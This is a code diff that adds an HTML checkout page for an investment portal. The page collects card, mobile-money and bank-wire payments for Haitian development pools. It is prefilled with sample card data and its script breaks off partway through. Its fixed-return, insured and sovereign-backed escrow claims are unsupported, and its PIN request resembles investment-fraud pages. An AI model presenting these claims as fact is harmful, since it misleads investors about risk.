@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html class="scroll-smooth" lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+  <title>Investors Funds Portal - Make Your Investment</title>
+  <meta content="Secure fund allocation and payment processing portal for Investors Funds Collection S.A."
+    name="description" />
+  <!-- Plus Jakarta Sans Font -->
+  <link href="https://fonts.googleapis.com" rel="preconnect" />
+  <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect" />
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&amp;display=swap"
+    rel="stylesheet" />
+  <!-- Tailwind CSS Runtime -->
+  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+  <style>
+    body {
+      font-family: 'Plus Jakarta Sans', system-ui, sans-serif;
+    }
+  </style>
+  <style id="ifc-language-toolbar">
+    .ifc-language-toolbar {
+      display: flex;
+      align-items: flex-end;
+      gap: 8px;
+      padding: 6px 8px;
+      background: rgba(255, 255, 255, .96);
+      border: 1px solid #e2e8f0;
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(6, 28, 61, .10);
+    }
+
+    .ifc-language-option {
+      width: 82px;
+      min-width: 82px;
+      border: 1px solid #dbe3ee;
+      background: #fff;
+      color: #475569;
+      border-radius: 8px;
+      padding: 6px 7px 7px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+      cursor: pointer;
+      transition: background-color .18s ease, color .18s ease, border-color .18s ease, transform .18s ease;
+      font: 700 11px/1.1 Arial, sans-serif;
+    }
+
+    .ifc-language-option:hover {
+      background: #eef5ff;
+      border-color: #8fb5e8;
+      color: #061c3d;
+      transform: translateY(-1px);
+    }
+
+    .ifc-language-option.is-selected {
+      background: #061c3d;
+      border-color: #061c3d;
+      color: #fff;
+    }
+
+    .ifc-flag {
+      width: 34px;
+      height: 24px;
+      border-radius: 3px;
+      overflow: hidden;
+      display: block;
+      position: relative;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, .18);
+    }
+
+    .ifc-flag.ht {
+      background: linear-gradient(to bottom, #0038a8 0 50%, #d21034 50% 100%);
+    }
+
+    .ifc-flag.fr {
+      background: linear-gradient(to right, #0055a4 0 33.33%, #fff 33.33% 66.66%, #ef4135 66.66% 100%);
+    }
+
+    .ifc-flag.us {
+      background: repeating-linear-gradient(to bottom, #b22234 0 9%, #fff 9% 18%);
+    }
+
+    .ifc-flag.us:before {
+      content: "";
+      position: absolute;
+      left: 0;
+      top: 0;
+      width: 48%;
+      height: 54%;
+      background: #3c3b6e;
+    }
+
+    .ifc-flag.us:after {
+      content: "";
+      position: absolute;
+      left: 5px;
+      top: 3px;
+      width: 2px;
+      height: 2px;
+      background: #fff;
+      box-shadow: 6px 0 #fff, 12px 0 #fff, 18px 0 #fff, 3px 4px #fff, 9px 4px #fff, 15px 4px #fff, 21px 4px #fff, 6px 8px #fff, 12px 8px #fff, 18px 8px #fff;
+    }
+
+    @media(max-width:700px) {
+      .ifc-language-toolbar {
+        gap: 5px;
+        padding: 5px
+      }
+
+      .ifc-language-option {
+        width: 68px;
+        min-width: 68px
+      }
+    }
+
+    @keyframes ifc-spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .ifc-spinner {
+      animation: ifc-spin .7s linear infinite;
+    }
+  </style>
+</head>
+
+<body class="bg-[#F8FAFC] text-slate-900 antialiased font-sans min-h-screen flex flex-col selection:bg-[#D92534] selection:text-white">
+
+  <!-- Shared Header -->
+  <div data-include="header"></div>
+
+  <!-- Main Content Area -->
+  <main class="flex-1 w-full max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
+    
+    <!-- Breadcrumb & Step Indicator -->
+    <div class="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 mb-8 pb-6 border-b border-slate-200/80">
+      <div>
+        <div class="flex items-center gap-2 text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1.5">
+          <span>Investment Flow</span>
+          <span>•</span>
+          <span class="text-[#D92534] font-bold">Step 1 of 2: Capital Allocation</span>
+        </div>
+        <h1 class="text-2xl sm:text-3xl lg:text-4xl font-extrabold text-[#061C3D] tracking-tight">
+          Make Your Investment
+        </h1>
+        <p class="text-slate-600 text-sm sm:text-base mt-1 font-normal">
+          Allocate capital directly into vetted Haitian trade, agriculture, and logistical infrastructure pools.
+        </p>
+      </div>
+
+      <div class="inline-flex items-center gap-3 bg-white border border-slate-200 px-4 py-2 rounded-xl shadow-xs self-start sm:self-center">
+        <div class="w-3 h-3 rounded-full bg-emerald-500 animate-pulse"></div>
+        <div class="text-xs">
+          <span class="text-slate-500 block">Active Escrow Session</span>
+          <span class="font-bold text-slate-800">IFC-9827-HT • Jean-Pierre L.</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Main 2-Column Grid -->
+    <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
+      
+      <!-- Left Column: Payment & Allocation Form (7 cols) -->
+      <div class="lg:col-span-7 bg-white rounded-3xl border border-slate-200/90 p-6 sm:p-8 lg:p-9 shadow-sm">
+        
+        <!-- Step 1: Select Method Tabs -->
+        <div class="mb-8">
+          <div class="flex items-center justify-between mb-4">
+            <h2 class="text-base sm:text-lg font-bold text-[#061C3D] flex items-center gap-2">
+              <span class="w-6 h-6 rounded-full bg-[#061C3D] text-white text-xs flex items-center justify-center font-bold">1</span>
+              <span>Select Payment Method</span>
+            </h2>
+            <span class="text-xs font-semibold text-emerald-700 bg-emerald-50 border border-emerald-200 px-2.5 py-0.5 rounded-full">
+              Zero Surcharge
+            </span>
+          </div>
+
+          <div class="grid grid-cols-2 sm:grid-cols-4 gap-3" role="radiogroup" aria-label="Payment method">
+            <!-- Debit Card -->
+            <button type="button" onclick="selectPaymentMethod('debit')" id="tab-debit"
+              class="payment-method-card relative flex flex-col items-center justify-between p-4 rounded-2xl border-2 border-[#1E40AF] bg-[#EFF6FF] text-left transition-all cursor-pointer shadow-xs">
+              <div class="w-full flex items-center justify-between">
+                <div class="w-4 h-4 rounded-full border-2 border-[#1E40AF] flex items-center justify-center">
+                  <div class="w-2 h-2 rounded-full bg-[#1E40AF] method-dot"></div>
+                </div>
+                <svg class="w-5 h-5 text-[#1E40AF]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <rect width="22" height="16" x="1" y="4" rx="2" stroke-width="2"></rect>
+                  <path d="M1 10h22" stroke-width="2"></path>
+                </svg>
+              </div>
+              <div class="w-full mt-3">
+                <div class="text-xs sm:text-sm font-bold text-[#061C3D] leading-tight method-title">Debit Card</div>
+                <div class="text-[10px] text-slate-500 mt-0.5">Direct bank debit</div>
+              </div>
+            </button>
+
+            <!-- Credit Card -->
+            <button type="button" onclick="selectPaymentMethod('credit')" id="tab-credit"
+              class="payment-method-card relative flex flex-col items-center justify-between p-4 rounded-2xl border border-slate-200 bg-white hover:border-slate-300 text-left transition-all cursor-pointer">
+              <div class="w-full flex items-center justify-between">
+                <div class="w-4 h-4 rounded-full border border-slate-300 flex items-center justify-center">
+                  <div class="w-2 h-2 rounded-full bg-[#1E40AF] method-dot hidden"></div>
+                </div>
+                <img alt="Cards" src="assets/cb-logo.svg" class="w-8 h-4 object-contain" />
+              </div>
+              <div class="w-full mt-3">
+                <div class="text-xs sm:text-sm font-bold text-slate-800 leading-tight method-title">Credit Card</div>
+                <div class="text-[10px] text-slate-500 mt-0.5">Visa, Master, Amex</div>
+              </div>
+            </button>
+
+            <!-- Phone App / Mobile Money -->
+            <button type="button" onclick="selectPaymentMethod('phone')" id="tab-phone"
+              class="payment-method-card relative flex flex-col items-center justify-between p-4 rounded-2xl border border-slate-200 bg-white hover:border-slate-300 text-left transition-all cursor-pointer">
+              <div class="w-full flex items-center justify-between">
+                <div class="w-4 h-4 rounded-full border border-slate-300 flex items-center justify-center">
+                  <div class="w-2 h-2 rounded-full bg-[#1E40AF] method-dot hidden"></div>
+                </div>
+                <svg class="w-5 h-5 text-slate-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <rect width="14" height="20" x="5" y="2" rx="2" stroke-width="2"></rect>
+                  <path d="M12 18h.01" stroke-width="2" stroke-linecap="round"></path>
+                </svg>
+              </div>
+              <div class="w-full mt-3">
+                <div class="text-xs sm:text-sm font-bold text-slate-800 leading-tight method-title">Phone App</div>
+                <div class="text-[10px] text-slate-500 mt-0.5">MonCash / Zelle</div>
+              </div>
+            </button>
+
+            <!-- Bank Wire Transfer -->
+            <button type="button" onclick="selectPaymentMethod('wire')" id="tab-wire"
+              class="payment-method-card relative flex flex-col items-center justify-between p-4 rounded-2xl border border-slate-200 bg-white hover:border-slate-300 text-left transition-all cursor-pointer">
+              <div class="w-full flex items-center justify-between">
+                <div class="w-4 h-4 rounded-full border border-slate-300 flex items-center justify-center">
+                  <div class="w-2 h-2 rounded-full bg-[#1E40AF] method-dot hidden"></div>
+                </div>
+                <svg class="w-5 h-5 text-slate-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11M20 10v11M8 14v4M12 14v4M16 14v4" stroke-width="2" stroke-linecap="round"></path>
+                </svg>
+              </div>
+              <div class="w-full mt-3">
+                <div class="text-xs sm:text-sm font-bold text-slate-800 leading-tight method-title">Bank Wire</div>
+                <div class="text-[10px] text-slate-500 mt-0.5">BNC / International</div>
+              </div>
+            </button>
+          </div>
+        </div>
+
+        <!-- Step 2: Payment Form Section -->
+        <form id="paymentForm" onsubmit="handleFormSubmit(event)">
+          
+          <!-- Method 1 & 2: Card Payment Section -->
+          <div id="section-card" class="space-y-4">
+            <div class="flex items-center justify-between">
+              <h2 class="text-base sm:text-lg font-bold text-[#061C3D] flex items-center gap-2">
+                <span class="w-6 h-6 rounded-full bg-[#061C3D] text-white text-xs flex items-center justify-center font-bold">2</span>
+                <span id="card-section-title">Card Credentials &amp; Verification</span>
+              </h2>
+              <div class="flex items-center gap-1.5 opacity-80">
+                <span class="text-[11px] font-semibold text-slate-400">Accepted:</span>
+                <span class="text-xs font-bold text-[#061C3D]">VISA</span>
+                <span class="text-xs font-bold text-[#D92534]">MC</span>
+                <span class="text-xs font-bold text-[#0B7A4B]">CB</span>
+              </div>
+            </div>
+
+            <div>
+              <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">Cardholder Full Name</label>
+              <input required type="text" id="cardName" value="Jean-Pierre Lafontant"
+                class="w-full h-12 px-4 text-sm text-slate-900 bg-white border border-slate-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#061C3D] focus:border-transparent transition-all font-medium" />
+            </div>
+
+            <div>
+              <div class="flex items-center justify-between mb-1.5">
+                <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider">Card Number</label>
+                <span class="text-[11px] text-slate-400 font-medium">Auto-masks middle digits for security</span>
+              </div>
+              <div class="relative">
+                <input required type="text" id="cardNumber" value="4111 •••• •••• 8827" maxlength="19"
+                  data-raw="4111882788278827"
+                  autocomplete="cc-number" inputmode="numeric"
+                  onfocus="handleCardFocus(this)"
+                  onblur="handleCardBlur(this)"
+                  oninput="handleCardInput(this)"
+                  class="w-full h-12 pl-4 pr-24 text-sm text-slate-900 bg-white border border-slate-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#061C3D] focus:border-transparent transition-all font-mono font-medium" />
+                <div class="absolute right-3.5 top-1/2 -translate-y-1/2 flex items-center gap-2">
+                  <!-- Eye toggle button -->
+                  <button type="button" id="toggleMaskBtn" onclick="toggleCardMask()" title="Show / Hide full card number"
+                    class="p-1 rounded-md text-slate-400 hover:text-[#061C3D] hover:bg-slate-100 transition-colors cursor-pointer">
+                    <svg id="eyeIcon" class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l18 18"></path>
+                    </svg>
+                  </button>
+                  <span class="text-xs font-extrabold text-[#1E40AF] bg-blue-50 px-2 py-0.5 rounded border border-blue-200" id="cardBadge">VISA</span>
+                </div>
+              </div>
+            </div>
+
+            <div class="grid grid-cols-2 gap-4">
+              <div>
+                <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">Expiry Date (MM/YY)</label>
+                <input required type="text" id="cardExpiry" value="12 / 29" maxlength="7" placeholder="MM / YY"
+                  autocomplete="cc-exp" oninput="formatExpiryInput(this)"
+                  class="w-full h-12 px-4 text-sm text-slate-900 bg-white border border-slate-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#061C3D] focus:border-transparent transition-all font-mono font-medium" />
+              </div>
+              <div>
+                <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center justify-between">
+                  <span>CVV / CVC</span>
+                  <span class="text-[10px] text-slate-400 font-normal">3-4 digits</span>
+                </label>
+                <input required type="password" id="cardCvv" value="882" maxlength="4" placeholder="•••"
+                  autocomplete="cc-csc"
+                  class="w-full h-12 px-4 text-sm text-slate-900 bg-white border border-slate-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#061C3D] focus:border-transparent transition-all font-mono font-medium tracking-widest" />
+              </div>
+            </div>
+
+            <div>
+              <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">Billing Country / Region</label>
+              <select class="w-full h-12 px-4 text-sm text-slate-900 bg-white border border-slate-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#061C3D] focus:border-transparent transition-all font-medium">
+                <option value="HT" selected>Haiti (Haïti - Gourdes / USD)</option>
+                <option value="US">United States (USD Diaspora Escrow)</option>
+                <option value="CA">Canada (CAD / USD)</option>
+                <option value="FR">France (EUR / USD)</option>
+              </select>
+            </div>
+          </div>
+
+          <!-- Method 3: Phone App / Mobile Money Section -->
+          <div id="section-phone" class="hidden space-y-4">
+            <h2 class="text-base sm:text-lg font-bold text-[#061C3D] flex items-center gap-2">
+              <span class="w-6 h-6 rounded-full bg-[#061C3D] text-white text-xs flex items-center justify-center font-bold">2</span>
+              <span>Mobile Wallet Authorization</span>
+            </h2>
+
+            <div>
+              <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">Mobile Network / Gateway</label>
+              <select class="w-full h-12 px-4 text-sm text-slate-900 bg-white border border-slate-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#061C3D] focus:border-transparent transition-all font-medium">
+                <option value="moncash" selected>MonCash (Digicel Haiti - Direct Merchant Escrow)</option>
+                <option value="natcash">Natcash (Natcom Haiti)</option>
+                <option value="zelle">Zelle (US Diaspora Bank Link)</option>
+              </select>
+            </div>
+
+            <div>
+              <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">Registered Mobile Number</label>
+              <div class="flex">
+                <span class="inline-flex items-center px-4 rounded-l-xl border border-r-0 border-slate-300 bg-slate-50 text-slate-600 font-semibold text-sm">
+                  +509
+                </span>
+                <input type="tel" placeholder="3701-9922" value="3829-1827"
+                  class="flex-1 h-12 px-4 text-sm text-slate-900 bg-white border border-slate-300 rounded-r-xl focus:outline-none focus:ring-2 focus:ring-[#061C3D] focus:border-transparent font-mono" />
+              </div>
+            </div>
+
+            <div class="bg-amber-50 border border-amber-200/80 rounded-2xl p-4 text-xs text-amber-900 leading-relaxed flex items-start gap-3">
+              <svg class="w-5 h-5 text-amber-600 shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" stroke-width="2" stroke-linecap="round"></path>
+              </svg>
+              <span>Upon clicking authorize, a push notification or USSD confirmation prompt will be sent directly to your phone for PIN validation.</span>
+            </div>
+          </div>
+
+          <!-- Method 4: Bank Wire Transfer Section -->
+          <div id="section-wire" class="hidden space-y-4">
+            <h2 class="text-base sm:text-lg font-bold text-[#061C3D] flex items-center gap-2">
+              <span class="w-6 h-6 rounded-full bg-[#061C3D] text-white text-xs flex items-center justify-center font-bold">2</span>
+              <span>Direct Bank Wire Instructions</span>
+            </h2>
+
+            <div class="bg-slate-50 border border-slate-200 rounded-2xl p-5 space-y-3 text-xs">
+              <div class="flex items-center justify-between border-b border-slate-200 pb-2">
+                <span class="text-slate-500 font-medium">Beneficiary Name</span>
+                <span class="font-bold text-[#061C3D]">Investors Funds Collection S.A.</span>
+              </div>
+              <div class="flex items-center justify-between border-b border-slate-200 pb-2">
+                <span class="text-slate-500 font-medium">Haitian Depository Bank</span>
+                <span class="font-bold text-slate-800">Banque Nationale de Crédit (BNC)</span>
+              </div>
+              <div class="flex items-center justify-between border-b border-slate-200 pb-2">
+                <span class="text-slate-500 font-medium">SWIFT / BIC Code</span>
+                <div class="flex items-center gap-2">
+                  <span class="font-mono font-bold text-slate-900">BNCDHTPP</span>
+                  <button type="button" onclick="copyWireCode('BNCDHTPP', this)" class="text-[#1E40AF] font-bold hover:underline">Copy</button>
+                </div>
+              </div>
+              <div class="flex items-center justify-between border-b border-slate-200 pb-2">
+                <span class="text-slate-500 font-medium">Escrow Account IBAN/Ref</span>
+                <div class="flex items-center gap-2">
+                  <span class="font-mono font-bold text-[#D92534]">HT02-BNCD-0819-2026-9827</span>
+                  <button type="button" onclick="copyWireCode('HT02-BNCD-0819-2026-9827', this)" class="text-[#1E40AF] font-bold hover:underline">Copy</button>
+                </div>
+              </div>
+              <div class="flex items-center justify-between pt-1">
+                <span class="text-slate-500 font-medium">Wire Memo Mandatory Code</span>
+                <span class="font-mono font-bold text-slate-900 bg-amber-100 px-2 py-0.5 rounded">IFC-9827-ESCROW</span>
+              </div>
+            </div>
+
+            <div>
+              <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">Attach Wire Confirmation Slip (Optional)</label>
+              <input type="file" class="w-full text-xs text-slate-500 file:mr-3 file:py-2.5 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-semibold file:bg-[#061C3D] file:text-white hover:file:bg-[#0B254E] file:cursor-pointer cursor-pointer border border-slate-200 rounded-xl p-2 bg-slate-50" />
+            </div>
+          </div>
+
+          <!-- Legal Escrow Clause Checkbox -->
+          <div class="mt-6 pt-6 border-t border-slate-200">
+            <label class="flex items-start gap-3 cursor-pointer">
+              <input required type="checkbox" checked class="mt-1 w-4 h-4 rounded text-[#D92534] focus:ring-[#D92534] border-slate-300" />
+              <span class="text-xs text-slate-600 leading-relaxed">
+                I hereby authorize the deposit of this capital allocation into the sovereign-backed escrow pool under Haitian Commercial Code. If development verification metrics fail authorization, all funds will be returned in full.
+              </span>
+            </label>
+          </div>
+
+          <!-- Authorize Submit Button -->
+          <div class="mt-7">
+            <button type="submit" id="submitPaymentBtn"
+              class="w-full h-14 bg-[#D92534] hover:bg-[#B91C1C] active:bg-[#991B1B] text-white font-extrabold text-base rounded-2xl transition-all shadow-md hover:shadow-lg cursor-pointer flex items-center justify-center gap-2 group">
+              <span id="submitBtnText">Authorise Security Deposit &amp; Transfer</span>
+              <svg id="submitBtnArrow" class="w-5 h-5 group-hover:translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path d="M14 5l7 7m0 0l-7 7m7-7H3" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></path>
+              </svg>
+            </button>
+          </div>
+
+          <!-- Security Footer Trust Badges -->
+          <div class="mt-5 flex flex-wrap items-center justify-center gap-4 text-xs text-slate-400">
+            <span class="inline-flex items-center gap-1.5">
+              <svg class="w-4 h-4 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <rect width="18" height="11" x="3" y="11" rx="2" stroke-width="2"></rect>
+                <path d="M7 11V7a5 5 0 0110 0v4" stroke-width="2"></path>
+              </svg>
+              <span>256-bit TLS Encrypted</span>
+            </span>
+            <span>•</span>
+            <span class="inline-flex items-center gap-1">
+              <span class="font-bold text-slate-600">PCI-DSS</span> Level 1 Audited
+            </span>
+            <span>•</span>
+            <span>Haitian Sovereign Covenant</span>
+          </div>
+        </form>
+      </div>
+
+      <!-- Right Column: Investment Pool & Projected Yield Card (5 cols) -->
+      <div class="lg:col-span-5 flex flex-col gap-6">
+        
+        <!-- Live Allocation Card -->
+        <div class="bg-[#061C3D] text-white rounded-3xl p-7 sm:p-8 shadow-xl relative overflow-hidden">
+          <!-- Background Glow Effect -->
+          <div class="absolute -right-16 -top-16 w-56 h-56 rounded-full bg-blue-500/10 blur-2xl pointer-events-none"></div>
+          <div class="absolute -left-16 -bottom-16 w-56 h-56 rounded-full bg-[#D92534]/15 blur-2xl pointer-events-none"></div>
+
+          <div class="relative z-10">
+            <div class="flex items-center justify-between mb-4">
+              <span class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/10 text-xs font-bold uppercase tracking-wider text-blue-200">
+                <span class="w-2 h-2 rounded-full bg-[#D92534]"></span>
+                Portfolio Allocation
+              </span>
+              <span class="text-xs font-semibold text-slate-300">USD Sovereign Pool</span>
+            </div>
+
+            <!-- Amount Display -->
+            <div class="my-4">
+              <div class="text-4xl sm:text-5xl font-black tracking-tight text-white flex items-baseline gap-1" id="displayAmount">
+                $5,000<span class="text-2xl font-bold text-blue-200">.00</span>
+              </div>
+              <p class="text-xs text-blue-200/80 mt-1 font-medium">Principal committed to insured Haitian trade liquidity</p>
+            </div>
+
+            <!-- Quick Amount Tiers -->
+            <div class="mt-6 pt-5 border-t border-white/10">
+              <span class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-2.5">Select Allocation Tier</span>
+              <div class="grid grid-cols-4 gap-2">
+                <button type="button" onclick="setAllocationAmount(1000, this)"
+                  class="amount-tier-btn py-2 px-2 rounded-xl text-xs font-bold bg-white/10 hover:bg-white/20 text-white transition-all text-center">
+                  $1,000
+                </button>
+                <button type="button" onclick="setAllocationAmount(5000, this)"
+                  class="amount-tier-btn py-2 px-2 rounded-xl text-xs font-bold bg-[#D92534] text-white shadow-sm transition-all text-center is-active-tier">
+                  $5,000
+                </button>
+                <button type="button" onclick="setAllocationAmount(10000, this)"
+                  class="amount-tier-btn py-2 px-2 rounded-xl text-xs font-bold bg-white/10 hover:bg-white/20 text-white transition-all text-center">
+                  $10,000
+                </button>
+                <button type="button" onclick="setAllocationAmount(25000, this)"
+                  class="amount-tier-btn py-2 px-2 rounded-xl text-xs font-bold bg-white/10 hover:bg-white/20 text-white transition-all text-center">
+                  $25,000
+                </button>
+              </div>
+            </div>
+
+            <!-- Pool Selection Dropdown -->
+            <div class="mt-5">
+              <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-2">Targeted Development Pool</label>
+              <select id="poolSelect" onchange="calculateProjections()"
+                class="w-full h-11 px-3.5 text-xs font-semibold text-slate-900 bg-white rounded-xl focus:outline-none focus:ring-2 focus:ring-[#D92534]">
+                <option value="14.2" selected>Port-au-Prince Logistic Hub Fund (14.2% APR)</option>
+                <option value="13.5">Agricultural Crop Export Pool (13.5% APR)</option>
+                <option value="15.0">Haitian Sovereign Diaspora Infrastructure (15.0% APR)</option>
+              </select>
+            </div>
+
+            <!-- Calculation Metrics Box -->
+            <div class="mt-6 bg-[#08234D] border border-white/10 rounded-2xl p-4.5 space-y-3">
+              <div class="flex items-center justify-between text-xs">
+                <span class="text-blue-200/80">Expected Annual Rate (APR)</span>
+                <span class="font-bold text-emerald-400 text-sm" id="metricApr">14.2% Fixed</span>
+              </div>
+              <div class="flex items-center justify-between text-xs">
+                <span class="text-blue-200/80">Capital Lockup Term</span>
+                <span class="font-bold text-white">6 Months</span>
+              </div>
+              <div class="flex items-center justify-between text-xs">
+                <span class="text-blue-200/80">Estimated Yield Return</span>
+                <span class="font-bold text-emerald-400 text-sm" id="metricYield">+$355.00 USD</span>
+              </div>
+              <div class="flex items-center justify-between text-xs border-t border-white/10 pt-2.5">
+                <span class="font-bold text-white">Estimated Maturity Payout</span>
+                <span class="font-extrabold text-base text-white" id="metricTotal">$5,355.00 USD</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Wire Transfer & Support Assist Card -->
+        <div class="bg-white rounded-3xl border border-slate-200/90 p-7 sm:p-8 shadow-xs">
+          <div class="flex items-center gap-3 mb-3">
+            <div class="w-10 h-10 rounded-xl bg-blue-50 text-[#1E40AF] flex items-center justify-center shrink-0">
+              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke-width="2" stroke-linecap="round"></path>
+              </svg>
+            </div>
+            <div>
+              <h3 class="text-base font-bold text-[#061C3D]">Need Wiring Support?</h3>
+              <p class="text-xs text-slate-500">Dedicated assistance for Diaspora &amp; Corporate transfers</p>
+            </div>
+          </div>
+          <p class="text-xs text-slate-600 leading-relaxed mb-5">
+            Our trade desk in Pétion-Ville verifies bank transfers directly with BNC and international correspondent banks. Reach our officer for transfers exceeding $50,000 USD.
+          </p>
+          <div class="flex flex-wrap items-center gap-3">
+            <button type="button" data-ifc-route="contact.html"
+              class="px-4 py-2.5 bg-slate-100 hover:bg-slate-200 text-slate-800 text-xs font-bold rounded-xl transition-all cursor-pointer">
+              Contact Support
+            </button>
+            <a href="tel:+50928134400"
+              class="px-4 py-2.5 border border-slate-200 hover:bg-slate-50 text-slate-700 text-xs font-bold rounded-xl transition-all">
+              +509 2813 4400
+            </a>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </main>
+
+  <!-- Shared Footer -->
+  <div data-include="footer"></div>
+
+  <!-- Scripts -->
+  <script src="js/include.js"></script>
+  <script src="js/translations.js"></script>
+  <script>
+    let currentAmount = 5000;
+
+    const SECTIONS = ['section-card', 'section-phone', 'section-wire'];
+
+    function showSection(id) {
+      SECTIONS.forEach(s => document.getElementById(s).classList.toggle('hidden', s !== id));
+    }
+
+    function selectPaymentMethod(method) {
+      ['debit', 'credit', 'phone', 'wire'].forEach(m => {
+        const tab   = document.getElementById(`tab-${m}`);
+        const dot   = tab.querySelector('.method-dot');
+        const title = tab.querySelector('.method-title');
+        const active = m === method;
+        tab.className  = active
+          ? 'payment-method-card relative flex flex-col items-center justify-between p-4 rounded-2xl border-2 border-[#1E40AF] bg-[#EFF6FF] text-left transition-all cursor-pointer shadow-xs'
+          : 'payment-method-card relative flex flex-col items-center justify-between p-4 rounded-2xl border border-slate-200 bg-white hover:border-slate-300 text-left transition-all cursor-pointer';
+        dot.classList.toggle('hidden', !active);
+        title.className = active
+          ? 'text-xs sm:text-sm font-bold text-[#061C3D] leading-tight method-title'
+          : 'text-xs sm:text-sm font-bold text-slate-800 leading-tight method-title';
+      });
+
+      if (method === 'debit' || method === 'credit') {
+        showSection('section-card');
+        document.getElementById('card-section-title').textContent =
+          method === 'debit' ? 'Debit Card Credentials & Pin' : 'Credit Card Credentials';
+      } else if (method === 'phone') {
+        showSection('section-phone');
+      } else if (method === 'wire') {
+        showSection('section-wire');
+      }
+    }
+
+    function setAllocationAmount(val, btn) {
+      currentAmount = val;
+      document.querySelectorAll('.amount-tier-btn').forEach(b => {
+        b.className = 'amount-tier-btn py-2 px-2 rounded-xl text-xs font-bold bg-white/10 hover:bg-white/20 text-white transition-all text-center';
+      });
+      btn.className = 'amount-tier-btn py-2 px-2 rounded-xl text-xs font-bold bg-[#D92534] text-white shadow-sm transition-all text-center is-active-tier';
+      
+      const formatted = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(val);
+      document.getElementById('displayAmount').innerHTML = `${formatted.replace('.00', '')}<span class="text-2xl font-bold text-blue-200">.00</span>`;
+      
+      calculateProjections();
+    }
+
+    function calculateProjections() {
+      const rate = parseFloat(document.getElementById('poolSelect').value) || 14.2;
+      document.getElementById('metricApr').textContent = `${rate.toFixed(1)}% Fixed`;
+      
+      // 6 month return = amount * (rate / 100) * 0.5
+      const sixMonthYield = currentAmount * (rate / 100) * 0.5;
+      const totalPayout = currentAmount + sixMonthYield;
+
+      document.getElementById('metricYield').textContent = `+${new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(sixMonthYield)} USD`;
+      document.getElementById('metricTotal').textContent = `${new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(totalPayout)} USD`;
+    }
+
+    let isCardMasked = true;
+
+    function getMaskedCard(raw) {
+      if (!raw || raw.length < 8) return formatWithSpaces(raw);
+      const first4 = raw.substring(0, 4);
+      const last4 = raw.length >= 16 ? raw.substring(12, 16) : raw.substring(raw.length - 4);
+      return `${first4} •••• •••• ${last4}`;
+    }
+
+    function formatWithSpaces(digits) {
+      return digits ? (digits.match(/.{1,4}/g) || []).join(' ') : '';
+    }
+
+    function updateCardBadge(v) {
+      const badge = document.getElementById('cardBadge');
+      if (!badge) return;
+      if (v.startsWith('4')) {
+        badge.textContent = 'VISA';
+        badge.className = 'text-xs font-extrabold text-[#1E40AF] bg-blue-50 px-2 py-0.5 rounded border border-blue-200';
+      } else if (v.startsWith('5') || v.startsWith('2')) {
+        badge.textContent = 'MASTERCARD';
+        badge.className = 'text-xs font-extrabold text-[#D92534] bg-red-50 px-2 py-0.5 rounded border border-red-200';
+      } else if (v.startsWith('3')) {
+        badge.textContent = 'AMEX';
+        badge.className = 'text-xs font-extrabold text-amber-700 bg-amber-50 px-2 py-0.5 rounded border border-amber-200';
+      } else {
